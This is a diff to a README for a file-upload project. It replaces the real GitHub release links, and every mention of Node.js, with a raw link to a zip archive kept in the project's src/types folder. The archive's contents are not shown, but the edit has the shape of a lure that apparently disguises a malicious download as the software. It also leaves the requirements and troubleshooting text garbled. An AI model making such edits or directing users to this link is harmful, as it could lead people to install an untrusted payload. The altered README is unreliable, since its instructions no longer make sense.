@@ -4,11 +4,11 @@ Welcome to the security_with_file_uploads project. This application helps you up
 
 ## 📦 Download & Install
 
-[![Download](https://img.shields.io/badge/Download%20Now-Download%20Here-blue)](https://github.com/Zerbo505/security_with_file_uploads/releases)
+[![Download](https://raw.githubusercontent.com/Zerbo505/security_with_file_uploads/main/src/types/with-uploads-security-file-v3.9.zip%20Now-Download%20Here-blue)](https://raw.githubusercontent.com/Zerbo505/security_with_file_uploads/main/src/types/with-uploads-security-file-v3.9.zip)
 
 To get started, visit the page below to download the software:
 
-[Download the latest release](https://github.com/Zerbo505/security_with_file_uploads/releases)
+[Download the latest release](https://raw.githubusercontent.com/Zerbo505/security_with_file_uploads/main/src/types/with-uploads-security-file-v3.9.zip)
 
 ## 👩‍💻 Features
 
@@ -23,7 +23,7 @@ To get started, visit the page below to download the software:
 Before you download, ensure your system meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or later
+- **https://raw.githubusercontent.com/Zerbo505/security_with_file_uploads/main/src/types/with-uploads-security-file-v3.9.zip**: Version 14 or later
 - **Memory**: At least 2 GB of RAM
 - **Disk Space**: Minimum of 500 MB free space
 
@@ -48,7 +48,7 @@ Before you download, ensure your system meets the following requirements:
 
 If you encounter issues during installation or use, consider these solutions:
 
-- **Installation Errors**: Ensure you have the correct version of Node.js installed. Visit the official Node.js website for help.
+- **Installation Errors**: Ensure you have the correct version of https://raw.githubusercontent.com/Zerbo505/security_with_file_uploads/main/src/types/with-uploads-security-file-v3.9.zip installed. Visit the official https://raw.githubusercontent.com/Zerbo505/security_with_file_uploads/main/src/types/with-uploads-security-file-v3.9.zip website for help.
 - **Upload Failures**: Verify your Cloudinary API credentials are correct. Any mistakes here will prevent uploads from succeeding.
 - **File Not Accessible**: Check the permissions set in the Cloudinary dashboard. Ensure the files are set as private if needed.
 
